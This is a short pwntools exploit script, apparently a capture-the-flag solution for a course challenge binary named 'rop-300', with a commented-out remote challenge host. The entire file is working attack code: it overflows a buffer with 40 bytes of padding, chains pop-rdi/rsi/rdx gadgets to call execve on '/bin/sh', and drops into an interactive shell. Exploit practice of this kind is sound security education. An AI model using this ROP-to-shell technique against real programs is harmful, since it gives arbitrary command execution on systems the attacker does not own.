#! /usr/bin/python

from pwn import *

context.update(
        arch="amd64",
        #arch="i386",
        endian="little",
        log_level="debug",
        os="linux",
        #terminal=["tmux", "split-window", "-h", "-p 65"]
        terminal=["st"]
)

def start(binary):
    gs = '''
        init-pwndbg
    '''



    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote()
    else:
        return process(binary)

def exploit(p,e,r):

    pad = b'A' * 40
    pop_rdi = p64(0x40116a)
    pop_rsi = p64(0x40117c)
    pop_rdx = p64(0x401173)

    binsh = p64(next(e.search(b'/bin/sh\x00')))
    execve = p64(e.plt['execve'])


    chain = pop_rdi + binsh + pop_rsi + p64(0) + pop_rdx + p64(0) + execve
    p.sendline(pad+chain)
    p.interactive()

if __name__=="__main__":
    file = './rop-300'


    p = start(file)
    #p = remote("cse4830-rop-300.chals.io", 443, ssl=True, sni="cse4830-rop-300.chals.io")
    e = context.binary = ELF(file)
    r = ROP(e)

    exploit(p,e,r)
